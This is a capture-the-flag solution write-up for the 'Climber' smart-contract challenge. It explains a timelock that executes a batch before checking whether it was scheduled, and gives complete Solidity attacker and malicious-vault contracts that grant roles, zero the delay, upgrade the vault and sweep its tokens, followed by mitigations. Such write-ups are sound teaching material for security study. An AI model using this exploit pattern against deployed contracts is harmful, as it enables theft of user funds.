# Climber - Solution

## Challenge Overview

A secure vault holds 10 million DVT tokens, protected by:
- **UUPS upgradeable proxy** pattern
- **Timelock contract** as owner (1 hour delay)
- **Proposer role** required to schedule operations
- **Sweeper role** for emergency fund recovery

**Goal:** Rescue all tokens from the vault

## The Vulnerability

### Execute-Before-Check Bug

The `ClimberTimelock.execute()` function has a critical flaw:

```solidity
function execute(address[] calldata targets, ..., bytes32 salt) external payable {
    // ... validation ...
    
    bytes32 id = getOperationId(targets, values, dataElements, salt);

    // 🚨 EXECUTE FIRST
    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    // 🚨 CHECK AFTER
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```

**The problem**: Operations are executed BEFORE checking if they were scheduled. This allows:

1. Calling `execute()` with a batch that includes scheduling itself
2. During execution, the batch schedules itself
3. After execution, the "is it scheduled?" check passes

### Additional Issues

- The timelock is the admin of itself, so it can grant roles
- The delay can be set to 0, making operations immediately executable
- The timelock owns the vault, so it can upgrade it

## Exploit Strategy

Create a batch of operations that:
1. **Grant PROPOSER_ROLE** to our attacker contract
2. **Set delay to 0** (so scheduled ops are immediately ready)
3. **Upgrade vault** to a malicious implementation
4. **Call attacker.scheduleOperation()** which schedules this exact batch

```
┌─────────────────────────────────────────────────────────────────┐
│                     timelock.execute()                          │
│                                                                 │
│  1. grantRole(PROPOSER_ROLE, attacker)                         │
│  2. updateDelay(0)                                              │
│  3. vault.upgradeToAndCall(maliciousImpl)                      │
│  4. attacker.scheduleOperation() ──┐                           │
│                                    │                            │
│  [Execute completes]               │                            │
│                                    ▼                            │
│  5. Check: Is operation scheduled? ← YES (scheduled in step 4) │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
              maliciousVault.sweepFunds(token, recovery)
```

## Solution Code

```solidity
// Malicious vault that allows open sweeping
contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function sweepFunds(address token, address recipient) external {
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }
    
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

// Attacker contract
contract ClimberAttacker {
    ClimberTimelock public immutable timelock;
    address public immutable vault;
    address public immutable maliciousImpl;
    address public immutable token;
    address public immutable recovery;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    function attack() external {
        // Operation 1: Grant PROPOSER_ROLE to this contract
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(
            timelock.grantRole,
            (PROPOSER_ROLE, address(this))
        ));

        // Operation 2: Set delay to 0
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(
            timelock.updateDelay,
            (0)
        ));

        // Operation 3: Upgrade vault to malicious implementation
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (maliciousImpl, "")
        ));

        // Operation 4: Call this contract to schedule the same batch
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeCall(this.scheduleOperation, ()));

        salt = bytes32("climber");

        // Execute - this calls scheduleOperation() which schedules this batch
        timelock.execute(targets, values, dataElements, salt);

        // Sweep funds from upgraded vault
        MaliciousVault(vault).sweepFunds(token, recovery);
    }

    // Called during execute() to schedule the same operation
    function scheduleOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
```

## Why This Works

1. **Self-referential scheduling**: The batch includes a call to schedule itself
2. **Callback during execution**: Our contract is called during `execute()` and can call `schedule()`
3. **Zero delay**: Setting delay to 0 means our scheduled operation is immediately "ReadyForExecution"
4. **Check passes**: When execute() finishes and checks, the operation is now scheduled and ready
5. **Vault upgrade**: We upgrade the vault to an implementation we control

## Attack Flow

```
Player
  │
  └──► Deploy MaliciousVault implementation
  │
  └──► Deploy ClimberAttacker
  │
  └──► attacker.attack()
            │
            └──► timelock.execute([
                    grantRole(PROPOSER, attacker),
                    updateDelay(0),
                    vault.upgradeToAndCall(maliciousImpl),
                    attacker.scheduleOperation()
                 ])
                    │
                    ├──► [1] attacker now has PROPOSER_ROLE
                    ├──► [2] delay is now 0
                    ├──► [3] vault upgraded to MaliciousVault
                    └──► [4] scheduleOperation() called
                            │
                            └──► timelock.schedule([same batch])
                                    │
                                    └──► Operation is now "Scheduled"
                                         with delay=0, so immediately "Ready"
                    │
                    └──► Check: getOperationState() == Ready? ✓
            │
            └──► MaliciousVault(vault).sweepFunds(token, recovery)
                    │
                    └──► 10M DVT → recovery
```

## Mitigation Recommendations

1. **Check before execute**: The classic fix - validate operation state BEFORE executing
   ```solidity
   if (getOperationState(id) != OperationState.ReadyForExecution) {
       revert NotReadyForExecution(id);
   }
   
   for (uint8 i = 0; i < targets.length; ++i) {
       targets[i].functionCallWithValue(dataElements[i], values[i]);
   }
   ```

2. **Minimum delay enforcement**: Don't allow delay to be set to 0
   ```solidity
   if (newDelay < MIN_DELAY) revert DelayTooShort();
   ```

3. **Role separation**: Don't allow the timelock to be its own admin

4. **Re-entrancy guard**: Prevent callbacks during execute()

